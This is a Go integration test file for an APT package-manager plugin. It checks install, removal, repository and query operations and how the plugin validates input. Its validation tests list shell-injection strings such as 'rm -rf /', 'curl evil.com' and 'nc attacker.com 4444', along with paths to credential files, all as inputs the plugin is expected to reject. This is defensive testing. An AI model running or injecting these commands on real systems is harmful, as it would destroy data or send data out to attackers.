//go:build integration

package main_test

import (
	"context"
	"os"
	"path/filepath"
	"time"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	main "github.com/jameswlane/devex/packages/package-manager-apt"
)

var _ = Describe("APT Package Manager Integration Tests", func() {
	var (
		plugin     *main.APTInstaller
		ctx        context.Context
		cancelFunc context.CancelFunc
		tmpDir     string
	)

	BeforeEach(func() {
		// Create context with timeout for all operations
		ctx, cancelFunc = context.WithTimeout(context.Background(), 30*time.Second)

		// Create temporary directory for test files
		var err error
		tmpDir, err = os.MkdirTemp("", "apt-integration-test-")
		Expect(err).NotTo(HaveOccurred())

		// Ensure cleanup even on test failure
		DeferCleanup(func() {
			if cancelFunc != nil {
				cancelFunc()
			}
			if tmpDir != "" {
				_ = os.RemoveAll(tmpDir)
			}
		})

		// Initialize plugin
		plugin = main.NewAPTPlugin()
	})

	AfterEach(func() {
		cancelFunc()
		if tmpDir != "" {
			os.RemoveAll(tmpDir)
		}
	})

	Describe("Package Installation Flow", func() {
		Context("when installing valid packages", func() {
			It("should successfully install a single package", func() {
				Skip("Requires root privileges and apt system access")

				// This would be a real integration test that requires:
				// - Root/sudo access
				// - Working APT system
				// - Network connectivity for package downloads
				err := plugin.Execute("install", []string{"curl"})
				Expect(err).ToNot(HaveOccurred())

				// Verify installation
				err = plugin.Execute("is-installed", []string{"curl"})
				Expect(err).ToNot(HaveOccurred())
			})

			It("should successfully install multiple packages", func() {
				Skip("Requires root privileges and apt system access")

				packages := []string{"git", "vim", "wget"}
				err := plugin.Execute("install", packages)
				Expect(err).ToNot(HaveOccurred())

				// Verify all packages are installed
				for _, pkg := range packages {
					err = plugin.Execute("is-installed", []string{pkg})
					Expect(err).ToNot(HaveOccurred())
				}
			})

			It("should handle already installed packages gracefully", func() {
				Skip("Requires root privileges and apt system access")

				// Install package first
				err := plugin.Execute("install", []string{"curl"})
				Expect(err).ToNot(HaveOccurred())

				// Try to install again - should not fail
				err = plugin.Execute("install", []string{"curl"})
				Expect(err).ToNot(HaveOccurred())
			})
		})

		Context("when installing invalid packages", func() {
			It("should fail gracefully for non-existent packages", func() {
				err := plugin.Execute("install", []string{"nonexistent-package-xyz"})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("not found"))
			})

			It("should validate package names and reject dangerous input", func() {
				dangerousPackages := []string{
					"package; rm -rf /",
					"package && curl evil.com",
					"package | nc attacker.com 4444",
					"package`whoami`",
					"package$(rm -rf /)",
					"package\nrm -rf /",
					"package\t; evil-command",
				}

				for _, pkg := range dangerousPackages {
					err := plugin.Execute("install", []string{pkg})
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("invalid"))
				}
			})

			It("should reject empty package lists", func() {
				err := plugin.Execute("install", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("no packages specified"))
			})

			It("should handle package installation failures", func() {
				Skip("Requires controlled environment to simulate installation failures")
			})
		})

		Context("with context cancellation", func() {
			It("should respect context cancellation during installation", func() {
				Skip("Requires integration with actual APT system")

				// Create a context that will be cancelled quickly
				shortCtx, cancel := context.WithTimeout(context.Background(), 100*time.Millisecond)
				defer cancel()

				// This would test that long-running installations can be cancelled
				// In practice, this needs careful setup to avoid leaving the system in a bad state
			})
		})
	})

	Describe("Package Removal Flow", func() {
		Context("when removing valid packages", func() {
			It("should successfully remove an installed package", func() {
				Skip("Requires root privileges and apt system access")

				// Install a package first
				err := plugin.Execute("install", []string{"curl"})
				Expect(err).ToNot(HaveOccurred())

				// Remove the package
				err = plugin.Execute("remove", []string{"curl"})
				Expect(err).ToNot(HaveOccurred())

				// Verify removal
				err = plugin.Execute("is-installed", []string{"curl"})
				Expect(err).To(HaveOccurred()) // Should fail because package is not installed
			})

			It("should handle removal of non-installed packages gracefully", func() {
				err := plugin.Execute("remove", []string{"nonexistent-package-xyz"})
				// Should not fail - removing non-existent packages is often a no-op
				Expect(err).ToNot(HaveOccurred())
			})
		})

		Context("when removing invalid packages", func() {
			It("should validate package names for removal", func() {
				dangerousPackages := []string{
					"package; rm -rf /",
					"package && curl evil.com",
					"package\nrm -rf /",
				}

				for _, pkg := range dangerousPackages {
					err := plugin.Execute("remove", []string{pkg})
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("invalid"))
				}
			})

			It("should reject empty package lists for removal", func() {
				err := plugin.Execute("remove", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("no packages specified"))
			})
		})
	})

	Describe("Repository Management Flow", func() {
		Context("when adding repositories", func() {
			It("should successfully add a repository with GPG key", func() {
				Skip("Requires root privileges and network access")

				keyURL := "https://example.com/key.gpg"
				keyPath := filepath.Join(tmpDir, "test-key.gpg")
				sourceLine := "deb https://example.com/repo stable main"
				sourceFile := filepath.Join(tmpDir, "test-repo.list")

				err := plugin.Execute("add-repository", []string{
					keyURL, keyPath, sourceLine, sourceFile,
				})
				Expect(err).ToNot(HaveOccurred())

				// Verify files were created
				Expect(keyPath).To(BeARegularFile())
				Expect(sourceFile).To(BeARegularFile())

				// Verify content
				sourceContent, err := os.ReadFile(sourceFile)
				Expect(err).ToNot(HaveOccurred())
				Expect(string(sourceContent)).To(ContainSubstring(sourceLine))
			})

			It("should validate repository URLs", func() {
				invalidRepos := []string{
					"", // Empty
					"invalid-repo-format",
					"deb ; rm -rf /",
					"deb https://evil.com/repo && curl evil.com",
					"deb https://evil.com/repo | nc attacker.com 4444",
				}

				keyPath := filepath.Join(tmpDir, "test-key.gpg")
				sourceFile := filepath.Join(tmpDir, "test-repo.list")

				for _, repo := range invalidRepos {
					err := plugin.Execute("add-repository", []string{
						"https://example.com/key.gpg", keyPath, repo, sourceFile,
					})
					Expect(err).To(HaveOccurred())
				}
			})

			It("should validate key URLs", func() {
				invalidKeyURLs := []string{
					"", // Empty
					"not-a-url",
					"ftp://example.com/key.gpg", // Invalid protocol
					"https://example.com/key.gpg; rm -rf /",
					"https://example.com/key.gpg && curl evil.com",
				}

				sourceLine := "deb https://example.com/repo stable main"
				sourceFile := filepath.Join(tmpDir, "test-repo.list")

				for _, keyURL := range invalidKeyURLs {
					err := plugin.Execute("add-repository", []string{
						keyURL, "/tmp/test-key.gpg", sourceLine, sourceFile,
					})
					Expect(err).To(HaveOccurred())
				}
			})

			It("should validate file paths", func() {
				// Test directory traversal prevention
				dangerousPaths := []string{
					"../../../etc/passwd",
					"/etc/shadow",
					"/root/.ssh/authorized_keys",
					"/bin/bash",
					"",
				}

				keyURL := "https://example.com/key.gpg"
				sourceLine := "deb https://example.com/repo stable main"

				for _, path := range dangerousPaths {
					err := plugin.Execute("add-repository", []string{
						keyURL, path, sourceLine, "/tmp/test-repo.list",
					})
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("invalid"))
				}
			})
		})

		Context("when removing repositories", func() {
			It("should successfully remove repository files", func() {
				Skip("Requires root privileges")

				// Create test files first
				keyPath := filepath.Join(tmpDir, "test-key.gpg")
				sourceFile := filepath.Join(tmpDir, "test-repo.list")

				err := os.WriteFile(keyPath, []byte("fake gpg key"), 0644)
				Expect(err).ToNot(HaveOccurred())

				err = os.WriteFile(sourceFile, []byte("deb https://example.com/repo stable main\n"), 0644)
				Expect(err).ToNot(HaveOccurred())

				// Remove repository
				err = plugin.Execute("remove-repository", []string{sourceFile, keyPath})
				Expect(err).ToNot(HaveOccurred())

				// Verify files were removed
				Expect(keyPath).ToNot(BeARegularFile())
				Expect(sourceFile).ToNot(BeARegularFile())
			})

			It("should validate paths before removal", func() {
				dangerousPaths := []string{
					"../../../etc/passwd",
					"/etc/shadow",
					"/bin/bash",
					"",
				}

				for _, path := range dangerousPaths {
					err := plugin.Execute("remove-repository", []string{path, "/tmp/safe-file"})
					Expect(err).ToNot(HaveOccurred()) // Should complete with warnings, not fail
				}
			})

			It("should handle missing files gracefully", func() {
				nonExistentFile1 := filepath.Join(tmpDir, "nonexistent1.list")
				nonExistentFile2 := filepath.Join(tmpDir, "nonexistent2.gpg")

				err := plugin.Execute("remove-repository", []string{nonExistentFile1, nonExistentFile2})
				Expect(err).ToNot(HaveOccurred()) // Should not fail for missing files
			})
		})

		Context("when validating repositories", func() {
			It("should validate APT configuration", func() {
				Skip("Requires APT system access")

				err := plugin.Execute("validate-repository", []string{})
				Expect(err).ToNot(HaveOccurred())
			})

			It("should detect configuration problems", func() {
				Skip("Requires controlled environment with broken APT config")
			})
		})
	})

	Describe("Package Query Operations", func() {
		Context("package search", func() {
			It("should search for packages", func() {
				Skip("Requires APT system access")

				err := plugin.Execute("search", []string{"curl"})
				Expect(err).ToNot(HaveOccurred())
			})

			It("should handle search with no results", func() {
				err := plugin.Execute("search", []string{"nonexistent-package-xyz-123"})
				// Search might not fail even with no results, depending on APT behavior
				// This test would verify the output handling
			})

			It("should require search terms", func() {
				err := plugin.Execute("search", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("no search term specified"))
			})
		})

		Context("package listing", func() {
			It("should list installed packages", func() {
				Skip("Requires APT system access")

				err := plugin.Execute("list", []string{})
				Expect(err).ToNot(HaveOccurred())
			})

			It("should handle list with flags", func() {
				Skip("Requires APT system access")

				err := plugin.Execute("list", []string{"--installed"})
				Expect(err).ToNot(HaveOccurred())
			})
		})

		Context("package information", func() {
			It("should show package information", func() {
				Skip("Requires APT system access")

				err := plugin.Execute("info", []string{"curl"})
				Expect(err).ToNot(HaveOccurred())
			})

			It("should handle multiple packages", func() {
				Skip("Requires APT system access")

				err := plugin.Execute("info", []string{"curl", "git"})
				Expect(err).ToNot(HaveOccurred())
			})

			It("should validate package names", func() {
				dangerousPackages := []string{
					"package; rm -rf /",
					"package\nrm -rf /",
				}

				for _, pkg := range dangerousPackages {
					err := plugin.Execute("info", []string{pkg})
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("invalid"))
				}
			})

			It("should require package names", func() {
				err := plugin.Execute("info", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("no package specified"))
			})
		})

		Context("installation status check", func() {
			It("should check if packages are installed", func() {
				Skip("Requires APT system access")

				// This would check actual package installation status
				err := plugin.Execute("is-installed", []string{"bash"}) // bash is usually installed
				Expect(err).ToNot(HaveOccurred())
			})

			It("should fail for non-installed packages", func() {
				err := plugin.Execute("is-installed", []string{"nonexistent-package-xyz"})
				Expect(err).To(HaveOccurred())
			})

			It("should validate package names", func() {
				dangerousPackages := []string{
					"package; rm -rf /",
					"package\nrm -rf /",
				}

				for _, pkg := range dangerousPackages {
					err := plugin.Execute("is-installed", []string{pkg})
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("invalid"))
				}
			})

			It("should require package names", func() {
				err := plugin.Execute("is-installed", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("no packages specified"))
			})
		})
	})

	Describe("System Update Operations", func() {
		Context("package list updates", func() {
			It("should update package lists", func() {
				Skip("Requires APT system access")

				err := plugin.Execute("update", []string{})
				Expect(err).ToNot(HaveOccurred())
			})

			It("should handle network failures during update", func() {
				Skip("Requires controlled network environment")
			})
		})

		Context("system upgrades", func() {
			It("should upgrade system packages", func() {
				Skip("Requires root privileges and APT system access")

				err := plugin.Execute("upgrade", []string{})
				Expect(err).ToNot(HaveOccurred())
			})

			It("should handle upgrade conflicts", func() {
				Skip("Requires controlled environment with package conflicts")
			})
		})
	})

	Describe("Multi-Step Operations", func() {
		Context("add repository then install package", func() {
			It("should complete full workflow successfully", func() {
				Skip("Requires root privileges and network access")

				// Step 1: Add repository
				keyURL := "https://example.com/key.gpg"
				keyPath := filepath.Join(tmpDir, "test-key.gpg")
				sourceLine := "deb https://example.com/repo stable main"
				sourceFile := filepath.Join(tmpDir, "test-repo.list")

				err := plugin.Execute("add-repository", []string{
					keyURL, keyPath, sourceLine, sourceFile,
				})
				Expect(err).ToNot(HaveOccurred())

				// Step 2: Update package lists
				err = plugin.Execute("update", []string{})
				Expect(err).ToNot(HaveOccurred())

				// Step 3: Install package from new repository
				err = plugin.Execute("install", []string{"test-package"})
				// This might fail if the repository doesn't actually contain the package,
				// but the workflow should complete without errors up to the installation attempt
			})
		})

		Context("install multiple packages with failure handling", func() {
			It("should handle partial failures gracefully", func() {
				Skip("Requires controlled environment with some valid and invalid packages")

				// Mix of valid and invalid packages
				packages := []string{"curl", "nonexistent-package-xyz", "git"}

				// The operation should fail, but the error should be informative
				err := plugin.Execute("install", packages)
				Expect(err).To(HaveOccurred())
				// Verify that valid packages might still be installed
				// and invalid packages are reported properly
			})
		})
	})

	Describe("Cleanup on Failures", func() {
		Context("repository addition failures", func() {
			It("should clean up partial repository files on failure", func() {
				Skip("Requires controlled failure scenario")

				// This would test that if repository addition fails partway through,
				// any created files are cleaned up properly
			})
		})

		Context("installation failures", func() {
			It("should not leave system in inconsistent state", func() {
				Skip("Requires controlled failure scenario")

				// This would test that failed installations don't leave
				// packages in a broken state
			})
		})
	})

	Describe("Command Validation", func() {
		Context("unknown commands", func() {
			It("should reject unknown commands", func() {
				err := plugin.Execute("unknown-command", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("unknown command"))
			})
		})

		Context("command injection prevention", func() {
			It("should prevent shell injection in all command paths", func() {
				commands := []string{
					"install", "remove", "search", "list", "info", "is-installed",
				}

				dangerousArgs := []string{
					"arg; rm -rf /",
					"arg && curl evil.com",
					"arg | nc attacker.com 4444",
					"arg`whoami`",
					"arg$(rm -rf /)",
					"arg\nrm -rf /",
				}

				for _, cmd := range commands {
					for _, arg := range dangerousArgs {
						if cmd == "search" && arg == "" {
							continue // search requires non-empty args
						}

						err := plugin.Execute(cmd, []string{arg})
						Expect(err).To(HaveOccurred())
						// Should fail due to validation, not execute dangerous commands
					}
				}
			})
		})
	})

	Describe("Error Message Quality", func() {
		Context("user-friendly error messages", func() {
			It("should provide actionable error messages", func() {
				// Test that error messages are helpful and not just technical
				err := plugin.Execute("install", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("no packages specified"))

				err = plugin.Execute("unknown-command", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("unknown command"))
			})

			It("should include context in error messages", func() {
				dangerousPackage := "package; rm -rf /"
				err := plugin.Execute("install", []string{dangerousPackage})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("invalid"))
				// Should include information about what was invalid
			})
		})
	})
})

// Helper function to check if a file exists and is regular
func fileExists(path string) bool {
	info, err := os.Stat(path)
	return err == nil && info.Mode().IsRegular()
}
